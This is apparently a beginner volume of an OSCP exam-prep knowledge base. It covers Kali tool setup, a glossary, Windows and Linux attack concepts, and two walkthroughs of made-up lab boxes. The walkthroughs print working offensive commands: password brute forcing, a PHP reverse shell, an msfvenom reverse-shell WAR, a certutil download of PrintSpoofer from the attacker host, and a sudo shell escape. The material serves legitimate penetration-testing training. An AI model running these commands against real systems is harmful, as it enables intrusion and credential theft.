# OSCP+ KNOWLEDGE BASE — VOLUME 9
## 👶 BEGINNER FOUNDATIONS: KALI SETUP · GLOSSARY · FIRST-BOX WALKTHROUGHS

> Start here if the other volumes feel like a foreign language. Read `[NOOB-PRIMER]` (Vol 0) first, then this.

---

# [KALI-PREINSTALLED]  📦 what ships with Kali vs. what you must add

**How Kali packaging works:** the default Kali image installs the `kali-linux-default` metapackage — that's most of what you need. Bigger sets exist (`kali-linux-large`, `kali-linux-everything`) but you don't need them. A handful of OSCP-critical tools are **NOT** in the default image and you install them yourself. `[COMMUNITY]` + `[GENERAL]`

**Check what you already have (before installing anything):**
```
for t in nmap ffuf feroxbuster gobuster nikto sqlmap hydra john hashcat searchsploit \
  smbclient smbmap enum4linux crackmapexec netexec impacket-scripts evil-winrm responder \
  proxychains4 socat nc dnsrecon snmpwalk wpscan whatweb medusa cewl crunch; do
  printf "%-16s " "$t"; command -v "$t" >/dev/null && echo OK || echo "MISSING"; done
# list a metapackage's contents:  apt-cache depends kali-linux-default
```

### ✅ Tier 1 — usually PREINSTALLED (just verify, don't reinstall)
```
nmap · netcat(nc) · metasploit · burpsuite (Community) · sqlmap · nikto · dirb · gobuster
ffuf · feroxbuster · whatweb · wafw00f · wpscan · hydra · medusa · john · hashcat · hashid
smbclient · smbmap · enum4linux · crackmapexec · impacket-scripts · ldapsearch(ldap-utils)
snmpwalk(snmp) · onesixtyone · dnsrecon · dnsenum · responder · proxychains4 · socat
searchsploit(exploitdb) · curl · wget · ssh · tmux · cewl · crunch · git · python3
```
*(evil-winrm ships on recent Kali; if `command -v evil-winrm` says MISSING, install it — Tier 2.)*

### 🔧 Tier 2 — NOT default → `apt install` (the classic gaps)
```
sudo apt update && sudo apt install -y seclists netexec evil-winrm exploitdb sshuttle pspy \
  ldapdomaindump windapsearch nbtscan dnsutils
# ⭐ seclists is the #1 "why isn't this here already" gap — you need it for fuzzing wordlists.
# netexec (nxc) is the modern crackmapexec; keep both.
```

### 🐍 Tier 3 — Python tools → `pipx` (isolated, no dependency hell)
```
sudo apt install -y pipx && pipx ensurepath
pipx install bloodhound        # bloodhound-python collector
pipx install certipy-ad        # ADCS (ESC1-8)
pipx install bloodyAD          # LDAP/ACL abuse
pipx install mitm6             # IPv6 relay (lab only; exam poisoning banned)
# (lsassy, pypykatz often come with netexec deps; else: pipx install lsassy pypykatz)
```

### ⬇️ Tier 4 — NOT in apt at all → download from GitHub into `~/tools` (see `[KALI-SETUP]` step 4)
```
linpeas.sh · winPEASx64.exe · pspy64 · chisel(+.exe) · ligolo-ng (proxy+agent)
PrintSpoofer64.exe · GodPotato · RoguePotato · JuicyPotatoNG · SweetPotato · RunasCs.exe
PowerView.ps1 · PowerUp.ps1 · SharpHound.exe · Rubeus.exe · mimikatz.exe · kerbrute
# all URLs are in [RESOURCES] / [RESOURCES-MORE].
```

> **Automation shortcut (optional):** community scripts like **pimpmykali** (Dewalt) or WeaponizeKali install ~95% of these in one go. Fine for *setup* — but you must still **understand** each tool (the exam is manual). Don't let a script be a substitute for knowing what `netexec`/`ligolo`/`secretsdump` actually do.

---

# [KALI-SETUP]  🛠️ get your Kali ready ONCE (do this before practising)

Nothing kills momentum like discovering mid-box that a tool isn't installed. Do this setup once.

> 👉 For **what each tool does + whether it's allowed in the exam** (✅ / 1️⃣ MSF-one-target / ⚠️ / ⛔), see **`[KALI-TOOLBOX]`** (every exam-usable Kali tool grouped by phase). This section = *install* them; that section = *understand & use* them.

## 1) Update the system
```
sudo apt update && sudo apt full-upgrade -y
```

## 2) Install the core toolset (most are pre-installed on Kali; this fills gaps)
```
sudo apt install -y seclists wordlists nmap feroxbuster ffuf gobuster nikto \
  smbclient smbmap enum4linux nbtscan snmp onesixtyone ldap-utils \
  netexec impacket-scripts evil-winrm responder proxychains4 exploitdb \
  hashcat john sqlmap hydra dnsrecon curl wget git python3-pip pipx mingw-w64 gcc-multilib
sudo apt update && sudo apt install exploitdb    # installs searchsploit + local Exploit-DB (usually pre-installed on Kali)
searchsploit -u                                  # update the local Exploit-DB copy
# tools that are better via pipx (isolated):
pipx install bloodhound            # bloodhound-python collector
pipx install netexec               # if apt version is old (replaces crackmapexec)
```
*(If a package name errors, that tool may already exist or have a slightly different name — check with `which <tool>`. Don't panic; you rarely need all of them on one box.)*

## 3) Unzip rockyou (the main password wordlist) — one time
```
sudo gunzip /usr/share/wordlists/rockyou.txt.gz     # → /usr/share/wordlists/rockyou.txt
ls -l /usr/share/seclists                            # confirm SecLists is there
```

## 4) Build a `~/tools` folder of things you copy TO targets
These aren't apt packages — they're scripts/binaries you download once, then serve to the victim with a web server. **Download from the official GitHub "Releases" pages.**
```
mkdir -p ~/tools/{linux,windows}
# LINUX enumeration/privesc (put in ~/tools/linux):
#   linpeas.sh          (PEASS-ng releases)
#   pspy64              (DominicBreuker/pspy releases)
#   chisel (linux amd64), agent/proxy for ligolo-ng (linux)
# WINDOWS enumeration/privesc (put in ~/tools/windows):
#   winPEASx64.exe      (PEASS-ng releases)
#   PrintSpoofer64.exe  (itm4n/PrintSpoofer releases)
#   GodPotato-NET4.exe  (BeichenDream/GodPotato releases)
#   nc.exe              (netcat for windows)
#   chisel.exe, ligolo agent.exe (windows amd64)
#   PowerView.ps1, PowerUp.ps1, SharpHound.exe, mimikatz.exe
```
Grab them once with your browser or `wget <release-url> -O ~/tools/linux/linpeas.sh`. (Exact URLs change with versions — search "linpeas releases" etc.)

## 5) Serve tools to a target (you'll do this constantly)
```
cd ~/tools/linux && python3 -m http.server 80          # then on target: wget http://$IP/linpeas.sh
# your $IP = your VPN address:  ip addr show tun0
```

## 6) Per-target folders (make one per box)
```
mkdir -p ~/oscp/target1/{scans,loot,exploits,www} && cd ~/oscp/target1
```

## 7) Nice-to-have quality-of-life
```
# fix rockyou path habit, add a quick alias to your ~/.zshrc:
echo 'alias serve="python3 -m http.server 80"' >> ~/.zshrc
echo 'alias tun="ip addr show tun0 | grep inet"' >> ~/.zshrc
source ~/.zshrc
# BloodHound GUI (for AD): install per current docs (BloodHound CE / neo4j)
```
✅ **You're ready.** You never need to redo this except updating tools occasionally.

---

# [GLOSSARY]  📖 plain-English jargon (what these words actually mean)

**Enumeration** — thoroughly poking a target to discover everything about it (open ports, services, versions, files, users). 80% of the exam. "Enumerate" = "investigate/list."

**Foothold / Initial access** — your *first* way to run commands on the target (a shell or code execution). Getting "in."

**Shell** — an interactive command prompt on the target. Your goal on every box.
- **Reverse shell** — the *target* connects back to *you*. (You run a listener; the target dials out.) Most common.
- **Bind shell** — the *target* opens a port and *you* connect to it. Used when the target can't dial out.
- **Webshell** — a script (e.g. PHP) you upload to a web server that runs commands via the browser.

**Listener** — a program on *your* Kali waiting for the target's reverse shell to connect. Usually `nc -lvnp 443`.

**Payload** — the code that gives you a shell (e.g. a reverse-shell one-liner, or a `.exe` from msfvenom).

**LHOST / LPORT** — *your* IP and port (where the shell comes back to). **RHOST / RPORT** — the *target's* IP and port.

**TTY / "stabilize the shell"** — upgrading a clunky shell into a proper interactive one (arrow keys, tab-complete, Ctrl-C don't kill it). See `[SHELL-QUICK]`.

**Privilege escalation (privesc)** — going from a low-power user to **root** (Linux) or **SYSTEM/Administrator** (Windows). The second 10 points on each box.

**Lateral movement** — using creds/hashes from one machine to get into *another* machine (same network). Core of AD.

**Pivoting** — routing your tools *through* a compromised machine to reach a network you can't touch directly. See `[PIVOT-QUICK]`.

**Enumeration vs Exploitation** — first you *find* the weakness (enum), then you *use* it (exploit).

**CVE** — a public ID for a known vulnerability (e.g. CVE-2021-4034). **PoC / Exploit** — code that abuses a vulnerability. See `[CVE-HITS]`.

**Hash** — a scrambled (one-way) version of a password. You "crack" it (guess the original) with a wordlist, or sometimes *use it directly* (Pass-the-Hash).
- **NTLM** — Windows password hash. **NetNTLMv2** — a hash captured from network authentication (e.g. by Responder).
- **Pass-the-Hash (PtH)** — logging in with the NTLM hash itself, no need to crack it.

**Wordlist** — a big text file of guesses (passwords or paths). `rockyou.txt` is the famous one.
- **Brute force** — trying many passwords against one account. **Password spraying** — trying *one* password against *many* accounts (safer re: lockouts).

**Active Directory (AD)** — Microsoft's system for managing users/computers in a Windows network. The 40-point exam set. Key pieces:
- **Domain Controller (DC)** — the server that runs AD (holds all accounts). Own it = own the domain.
- **Kerberos / TGT / TGS** — AD's login ticket system. **Kerberoasting** = get crackable hashes of service accounts. **AS-REP roasting** = get crackable hashes of users with a specific weak setting.
- **DCSync** — asking the DC to hand over all password hashes (needs high privilege). Game over.
- **BloodHound** — a tool that maps AD and draws the shortest path to Domain Admin.

**SMB (445)** — Windows file sharing + the protocol used for tons of AD attacks. **LDAP (389)** — the "phone book" query protocol for AD.

**Web vulns (quick defs):** **LFI** = read local files via a web param. **RFI** = include a remote file → code exec. **SQLi** = inject SQL to read the database. **SSTI** = inject template code → exec. **SSRF** = make the server fetch a URL for you. **XXE** = abuse XML parsing to read files. **IDOR** = access other users' data by changing an ID. **Command injection** = your input reaches the OS shell.

**SUID** — a Linux file flag letting a program run as its owner (often root) → privesc if abusable. **sudo** — run a command as another user (usually root). **Capability** — a fine-grained Linux root-power on a binary. **Cron** — scheduled tasks (often run as root).

**proxychains / SOCKS** — tools/protocol to send your commands through a pivot. **vhost** — a website served based on the hostname (add to `/etc/hosts`). **subnet** — a range of IPs (e.g. `172.16.5.0/24`).

**local.txt / proof.txt** — the flag files. `local.txt` = proof of low-priv access (10 pts). `proof.txt` = proof of root/SYSTEM (10 pts).

**Revert** — reset a target to a clean state (free; do it if a box acts broken). **Rabbit hole** — a dead-end you waste time on; the exam's biggest trap.

---

# [CONCEPTS]  🧠 how it actually works (theory → why the attack works)
> The `[GLOSSARY]` gives one-liners; this gives the *understanding*. Each concept ends with **the attack it enables** — that's the point of learning it. This is the theory layer PEN-200 assumes.

## Windows / AD authentication — the big picture
Windows proves *who you are* with one of two protocols: **NTLM** (older, challenge-response) or **Kerberos** (AD default, ticket-based). Both ultimately rely on a **password hash**, never the plaintext. Understand these two + how they store/pass secrets and 80% of AD "clicks."

## [CONCEPT-NTLM]  NTLM & the NT hash
- Your password is stored as an **NT hash** (unsalted MD4 of the password) in the SAM (local) or NTDS.dit (domain).
- **NTLM authentication** is challenge-response: server sends a challenge, client encrypts it with the NT hash → server verifies. The plaintext never crosses the wire; the **NT hash itself is the secret**.
- **→ Attack (Pass-the-Hash):** because the NT hash *is* the credential, if you steal it you can authenticate **without cracking it** (`nxc -H`, `evil-winrm -H`, `psexec -hashes`). This is why dumping SAM/LSASS is game-changing.
- **NetNTLMv1/v2** = the hash of the *challenge-response* captured on the wire (Responder). It's **NOT** the NT hash — you can't PtH it; you **crack** it (`-m 5600`) or **relay** it.

## [CONCEPT-KERBEROS]  Kerberos — tickets, TGT, TGS
The DC runs a **KDC**. Flow: (1) you prove yourself to the KDC and get a **TGT** (Ticket-Granting Ticket) — encrypted with the *krbtgt* account's key; (2) you present the TGT to ask for a **TGS** (service ticket) for a specific service — encrypted with *that service account's* key; (3) you present the TGS to the service, which decrypts it to trust you.
- **→ Kerberoasting:** *anyone* can request a TGS for any service with an **SPN**. The TGS is encrypted with the **service account's password hash** → request it, crack it offline (`-m 13100`). Works because you don't need to reach the service, just ask the KDC.
- **→ AS-REP roasting:** if a user has "pre-auth disabled," the KDC's **AS-REP** is encrypted with *their* hash and handed out with no proof of identity → crack it (`-m 18200`). No credentials needed.
- **→ Pass-the-Ticket / Overpass-the-Hash:** steal or forge a TGT/TGS and inject it (`KRB5CCNAME`). **Golden Ticket** = forge *any* TGT using the stolen **krbtgt** hash (total domain forge). **Silver Ticket** = forge a TGS for one service using that service's hash.

## [CONCEPT-SPN]  Service Principal Name (SPN)
An SPN maps a **service instance** (e.g. `MSSQL/db01.corp.local`) to the **account that runs it**. Kerberos uses it to pick which account's key encrypts the TGS. **→ Attack:** accounts *with* an SPN are Kerberoastable — and service accounts are often high-privilege with weak passwords. `GetUserSPNs` lists them.

## [CONCEPT-SID]  SID & RID  → full detail in `[AD-SID]`
A **SID** (`S-R-X-Y`) uniquely identifies every principal; the last number is the **RID**. The domain SID + a RID = a specific user. **→ Attacks:** RID cycling enumerates users; the domain SID is needed to forge tickets.

## [CONCEPT-TOKENS]  Windows access tokens
When you log in, Windows builds an **access token** describing your privileges/SIDs; every process carries a copy. Two kinds: **primary** (attached to a process) and **impersonation** (lets a thread act as another user — how services handle client requests).
- **→ Attack (SeImpersonate → Potato):** a service account with **SeImpersonatePrivilege** can impersonate any token it's handed. The "Potato" exploits trick a **SYSTEM** process into authenticating to the attacker, then impersonate its token → become SYSTEM. This is why SeImpersonate on IIS/MSSQL/service accounts is an instant win.

## [CONCEPT-AD-STRUCTURE]  Domain, DC, Forest, OU, GPO, GC
- **Domain** = a boundary of users/computers sharing a database. **Domain Controller (DC)** = the server holding it (AD DS) + the KDC. Own the DC = own the domain.
- **Forest** = one or more domains sharing a schema/trust (the top security boundary). **OU** = a folder for organizing/​delegating objects. **GPO** = Group Policy, pushes settings/scripts to machines (abusable if you can edit one). **Global Catalog (GC, 3268)** = a forest-wide searchable index of objects.

## [CONCEPT-LDAP]  LDAP vs AD
**AD** is the database; **LDAP** (389/636) is the *protocol* you query it with. Users, groups, computers, their attributes (incl. `description`, SPNs, `msDS-*` flags) all live in LDAP. **→ Attack:** anonymous/authed LDAP dumps the whole directory — users, roastable accounts, delegation flags, sometimes passwords in `description`.

## [CONCEPT-DELEGATION]  Delegation (why it's abusable)
Delegation lets a service act **on behalf of** a user to reach another service (e.g. web server → DB as *you*). **Unconstrained** = the service caches your full TGT (compromise it → steal any TGT that touches it). **Constrained** = limited to named services (S4U abuse to impersonate anyone to those). **RBCD** = the *target* says who may delegate to it (write that attribute → impersonate admin to it). All three end in "impersonate a privileged user."

## [CONCEPT-DCSYNC]  DCSync / replication
DCs sync their databases using the **Directory Replication Service** protocol. **→ Attack:** any principal granted *Replicating Directory Changes* rights (Domain Admins, or a delegated account BloodHound flags) can **ask a DC to replicate password hashes** — including **krbtgt** and **Administrator** — without touching disk. `secretsdump` does this. It's the usual "game over."

## [CONCEPT-HASHES]  hash types — crack vs. pass
- **NT hash** (Windows, 32 hex): **pass it** (PtH) or crack (`-m 1000`).
- **NetNTLMv2** (Responder capture): **crack** (`-m 5600`) or relay — cannot PtH.
- **Kerberos** TGS (`-m 13100`) / AS-REP (`-m 18200`): **crack** only.
- **Linux** `$6$` sha512crypt (`-m 1800`), `$1$` md5crypt (`-m 500`), bcrypt `$2$` (`-m 3200`): crack from `/etc/shadow`.
- **Golden rule:** if it's an NT hash, **try passing it before wasting time cracking**.

## [CONCEPT-LINUX-PERMS]  SUID/SGID, sudo, capabilities (what they *are*)
- **SUID/SGID** bit: a program runs as its **owner/group** (often root) regardless of who launches it — designed for tools like `passwd`. **→ Attack:** a SUID binary that can run commands/read/write (GTFOBins) does so *as root*.
- **sudo**: runs a command as another user per `/etc/sudoers`. **→ Attack:** a permitted binary with a shell escape (GTFOBins) = root.
- **Capabilities**: fine-grained slices of root power on a binary (e.g. `cap_setuid`). **→ Attack:** `cap_setuid` on python = instant root.

## [CONCEPT-WEB-AUTH]  sessions, cookies, JWT
HTTP is stateless, so after login the server issues a **session** identified by a **cookie**. **JWT** = a self-contained signed token (header.payload.signature) the server trusts if the signature checks. **→ Attacks:** steal/forge the cookie (IDOR/tamper `role=admin`), or forge a JWT (weak HMAC secret → crack + re-sign, or `alg:none`).

---

# [FIRST-BOX-WALKTHROUGH]  🎬 see it all connect (two full examples)

> These are **representative** easy boxes (made-up IPs, not real exam machines) narrated the way an experienced tester thinks. Follow the *reasoning*, not just the commands.

## Example A — a typical easy LINUX box  (target `192.168.150.50`)

**① Setup + scan** (`[NMAP-QUICK]`)
```
mkdir -p ~/oscp/box50/{scans,loot} && cd ~/oscp/box50
T=192.168.150.50
nmap -p- --min-rate 2000 -Pn -oN scans/all.txt $T
# → shows: 22 (ssh), 80 (http)
nmap -p22,80 -sCV -Pn -oN scans/scv.txt $T
# → 22 OpenSSH 8.2p1 Ubuntu ; 80 Apache 2.4.41, title "Meridian Blog"
```
*Think:* Only 22 and 80. SSH is rarely the way in by itself — **the web server is my target** (Golden Rule: web gets full attention).

**② Web enumeration** (`[WEB-QUICK]`)
```
whatweb http://$T                 # → WordPress 5.7.2, PHP
curl -s http://$T/robots.txt      # → /wp-admin/, nothing juicy
feroxbuster -u http://$T -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x php
# → /wp-login.php, /wp-content/, /uploads/
```
*Think:* It's WordPress. Two cheap moves: (a) scan for vulnerable plugins with `wpscan`, (b) try weak admin creds.
```
wpscan --url http://$T --enumerate vp,u              # → user "admin"; plugin "photo-gallery 1.5.35"
searchsploit photo-gallery 1.5.35                     # → an exploit exists? or check the users
```
Say wpscan found user **admin** but no easy plugin RCE. Try a small password guess (evidence: it's an easy box):
```
wpscan --url http://$T -U admin -P /usr/share/wordlists/rockyou.txt   # → password: "sunshine1"
```

**③ Foothold** (`[FOOTHOLD-CHECKLIST]`, WordPress trick from `[ADDENDUM-WEB-CMS]`)
Log into `/wp-admin` as `admin:sunshine1`. WordPress admins can edit theme PHP → instant RCE:
- Appearance → Theme Editor → edit `404.php`, paste a PHP reverse shell (`[SHELL-LINUX]`), set `LHOST` = your `tun0` IP, port 443.
```
ip addr show tun0        # → my IP is 10.10.14.7  (this is LHOST)
nc -lvnp 443             # start listener BEFORE triggering
curl http://$T/wp-content/themes/<theme>/404.php     # trigger the shell
# → listener catches a connection: "www-data@meridian"
```

**④ Stabilize** (`[SHELL-QUICK]`)
```
python3 -c 'import pty;pty.spawn("/bin/bash")'
# Ctrl-Z
stty raw -echo; fg
# (Enter twice)
export TERM=xterm
```

**⑤ Grab the first flag NOW** (10 pts banked)
```
find / -name local.txt 2>/dev/null      # → /home/jenny/local.txt  (or user's home)
cat /home/jenny/local.txt ; id ; ip a   # → SCREENSHOT all three together
```
*(Some Linux boxes only have proof.txt; grab whatever flag is present as low-priv.)*

**⑥ Local enum → privesc** (`[LINUX-PRIVESC-QUICK]`)
```
id                          # www-data
sudo -l                     # → (nothing / needs password)
find / -perm -4000 -type f 2>/dev/null    # SUID list
# also loot WP config for creds:
cat /var/www/html/wp-config.php | grep -i pass   # → DB pass "S3cureDB!" → try it as jenny/other users
su jenny                    # try reused password → success? now you're jenny
sudo -l                     # as jenny → (ALL) NOPASSWD: /usr/bin/find
```
*Think:* `sudo find` with NOPASSWD → straight to `[LINUX-SUDO]` / GTFOBins:
```
sudo find . -exec /bin/bash \; -quit         # GTFOBins "find" sudo escape → root shell
id                                            # uid=0(root)
```

**⑦ Root flag** (10 pts)
```
cat /root/proof.txt ; id ; ip a              # → SCREENSHOT all three
```
**Done: 20/20.** Loot `/etc/shadow`, SSH keys, and any other creds for the rest of the exam.

---

## Example B — a typical easy WINDOWS box  (target `192.168.150.60`)

**① Scan**
```
T=192.168.150.60
nmap -p- --min-rate 2000 -Pn -oN scans/all.txt $T      # → 135,139,445,3389,5985,8080
nmap -p135,139,445,3389,5985,8080 -sCV -Pn -oN scans/scv.txt $T
# → 445 SMB, 5985 WinRM, 8080 Apache Tomcat 9.0.30
```
*Think:* SMB to check, and **Tomcat on 8080** — Tomcat with default creds = deploy a WAR = shell.

**② Enumerate**
```
nxc smb $T -u '' -p '' --shares          # null session → maybe a readable share
# Tomcat: browse http://$T:8080/  → /manager/html asks for login
# try default creds: tomcat:tomcat, admin:admin, tomcat:s3cret
```
Say `tomcat:s3cret` works on `/manager/html`.

**③ Foothold** (`[WEB-UPLOAD]` → Tomcat WAR)
```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.7 LPORT=443 -f war -o shell.war
# upload shell.war via Tomcat Manager "Deploy" → it appears as an app
nc -lvnp 443
curl http://$T:8080/shell/                # browse the deployed app → triggers shell
# → shell as "tomcat" service account on WIN-BOX
```

**④ First flag NOW**
```
whoami                                   # tomcat
type C:\Users\tomcat\Desktop\local.txt & whoami & ipconfig     # SCREENSHOT together
```

**⑤ Privesc** (`[WINDOWS-PRIVESC-QUICK]`)
```
whoami /priv
# → SeImpersonatePrivilege  Enabled   ← service accounts usually have this!
```
*Think:* SeImpersonate → **Potato attack** → SYSTEM (`[WINDOWS-TOKENS]`). Transfer PrintSpoofer:
```
# on Kali:  cd ~/tools/windows && python3 -m http.server 80
# on target:
certutil -urlcache -split -f http://10.10.14.7/PrintSpoofer64.exe C:\Windows\Temp\ps.exe
C:\Windows\Temp\ps.exe -i -c "cmd"       # → whoami = nt authority\system
```

**⑥ Root flag**
```
type C:\Users\Administrator\Desktop\proof.txt & whoami & ipconfig   # SCREENSHOT
```
**Done: 20/20.** Then `secretsdump`/loot creds for lateral movement / the AD set.

---

## What both walkthroughs teach (the pattern behind every box)
```
SCAN everything  →  pick the most promising service  →  ENUMERATE it fully
→  cheap foothold (default/weak creds > known exploit > web vuln)
→  STABILIZE shell  →  grab + screenshot the low-priv flag IMMEDIATELY
→  local enum (sudo -l / whoami /priv first!)  →  the ONE quick-win privesc
→  root/SYSTEM  →  screenshot proof  →  LOOT creds for the next box
```
Every box is a variation of this. The guide's job is to answer "what do I check next?" at each arrow. Now go do easy boxes on Proving Grounds / HTB and run this loop until it's automatic. `[BEGINNER-START-HERE]`

---

# [STUDY-TRACKER]  📊 turn practice into a pass

> **The KB is content-complete — reps are what's left.** This tracker makes your practice *measurable* so you drill the right thing instead of grinding random boxes. There's an **interactive version** (`OSCP-Study-Tracker.html`) that saves to your browser and auto-charts your weakest stage. Below is the paper/markdown version if you prefer.

## How it works
1. After **every** practice box, log one row — honestly.
2. The field that matters most is **“Where I got stuck”** — that's your weak-signal.
3. After ~15 boxes, whichever stage has the most “stuck” marks is **exactly what to drill next**.
4. Target **~40–60 boxes, AD-weighted** (aim ≥30% AD/Windows). When you can root PG-intermediate boxes without hints, you're ready.

## Per-box row (copy this table into your notes / use the interactive HTML)
```
| Date | Box | Source | OS(L/W/AD) | Diff | Result(Root/Foothold/Fail) | TTF(min) | Foothold vector | Privesc vector | Hints(None/Some/Heavy) | STUCK stage | What I missed | Lesson |
```
Example filled row:
```
| 2026-08-21 | Meridian | PG | L | Easy | Root | 40 | Web-WP theme RCE | sudo find (GTFOBins) | None | Nowhere | — | always sudo -l before anything |
| 2026-08-22 | Heist    | PG | W | Med  | Foothold | 65 | Cred reuse | (stuck) | Heavy | Windows privesc | missed SeImpersonate→Potato | whoami /priv FIRST on Windows |
```

## Weak-area tally (tick each time a box got you stuck there)
```
Enumeration        : ....................   → drill [NMAP-QUICK] [ENUM-DECISION]
Web exploitation   : ....................   → drill [WEB-QUICK] [SQLI]
Foothold/access    : ....................   → drill [FOOTHOLD-CHECKLIST] [EXPLOIT-RESEARCH]
Linux privesc      : ....................   → drill [LINUX-PRIVESC-QUICK]
Windows privesc    : ....................   → drill [WINDOWS-PRIVESC-QUICK]
Active Directory   : ....................   → drill [AD-QUICK] [AD-ATTACK-PATH]
Pivoting           : ....................   → drill [PIVOT-QUICK]
Reporting          : ....................   → drill [REPORTING]
```
Tallest column = your next 5 boxes' focus. Re-check every ~10 boxes; the goal is to watch your tall bar shrink.

## Readiness gate (don't schedule until all true)
```
[ ] Rooted 40–60+ boxes, ≥30% Windows/AD
[ ] Can root a PG-intermediate box start→proof with NO hints
[ ] Ran ≥5 full AD chains (enum→BloodHound→roast→lateral→DC) unaided
[ ] Pivoted through a host (Ligolo/Chisel) at least a few times
[ ] Wrote ≥1 practice report with screenshots + repro from your notes
[ ] Your weak-area radar has no single dominant tall bar left
```

---
*End Volume 9 & the Knowledge Base. Foundations (Vol 9) → methodology (Vol 0) → techniques (Vol 1–5) → lookups (Vol 6) → syllabus+flow (Vol 7) → war room (Vol 8). Now go log boxes in `[STUDY-TRACKER]` and clear it. 🎯*
